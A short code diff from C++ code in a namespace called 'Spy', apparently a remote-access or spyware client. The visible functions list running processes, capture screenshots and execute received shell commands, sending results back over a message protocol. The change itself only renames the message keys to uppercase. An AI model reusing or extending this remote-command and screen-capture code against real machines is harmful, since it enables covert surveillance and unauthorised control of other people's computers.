@@ -54,7 +54,7 @@ namespace Spy {
 	    }
       
 	    ss << "//end//";
-	    (*proto)["list_proc"](ss.str());
+	    (*proto)["LIST_PROC"](ss.str());
 	}
     
 	void do_get_screenshot(string data) {
@@ -74,7 +74,7 @@ namespace Spy {
 	    f.close();
 
 	    cout << ss.str().length() << endl;
-	    (*proto)("screenshot")(ss.str(), w, h);
+	    (*proto)("SCREENSHOT")(ss.str(), w, h);
 	}
 
 	void do_send_cmd(string _cmd) {
@@ -83,7 +83,7 @@ namespace Spy {
 	    cmd.exec(_cmd.c_str());
 	    stringstream ss(cmd.get_res());
 	    ss << " //end//";
-	    (*proto)["res_cmd"](ss.str());
+	    (*proto)["RES_CMD"](ss.str());
 	}
 
     private:
